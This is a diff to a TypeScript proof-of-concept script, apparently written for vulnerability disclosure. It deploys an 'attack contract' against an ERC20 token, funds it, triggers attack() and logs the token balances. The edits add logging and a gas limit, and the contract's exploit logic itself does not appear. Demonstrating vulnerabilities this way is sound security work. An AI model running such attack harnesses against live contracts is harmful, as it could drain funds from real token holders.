@@ -25,29 +25,33 @@ async function main() {
   console.log(`ERC20 Balance of owner before transaction: ${formatUnits(balance, 6)}`);
 
   // deploy contract
+  console.log("deploying attack contract")
   const factory = new POC24__factory(owner);
   const attackContract = await factory.deploy(ERC20_ADDRESS, RECIPIENT_ADDRESS);
   await attackContract.waitForDeployment();
 
-  console.log("contract address: ", await attackContract.getAddress())
+  console.log("attack contract address: ", await attackContract.getAddress())
 
   // transfer the amount to contract
+  console.log("transferring 1000 tokens to attack contract")
   const tx = await nibi_erc20.transfer(attackContract, parseUnits("1000", 6));
   await tx.wait();
+  console.log("transfer complete")
 
   // show end balance
   const balanceBefore = await nibi_erc20.balanceOf(attackContract);
-  console.log(`ERC20 Balance of contract before transaction: ${formatUnits(balanceBefore, 6)}`);
+  console.log(`ERC20 Balance of contract before attack begins: ${formatUnits(balanceBefore, 6)}`);
 
   // call attack
-  const tx2 = await attackContract.attack({});
+  console.log("calling attack")
+  const tx2 = await attackContract.attack({gasLimit: 1_000_000});
   // get transaction receipt
   const receipt = await tx2.wait();
   console.log("Transaction receipt:", receipt);
 
   // show end balance
   const balanceAfter = await nibi_erc20.balanceOf(attackContract);
-  console.log(`ERC20 Balance of contract after transaction: ${formatUnits(balanceAfter, 6)}`);
+  console.log(`ERC20 Balance of contract after attack: ${formatUnits(balanceAfter, 6)}`);
 }
 
 main();
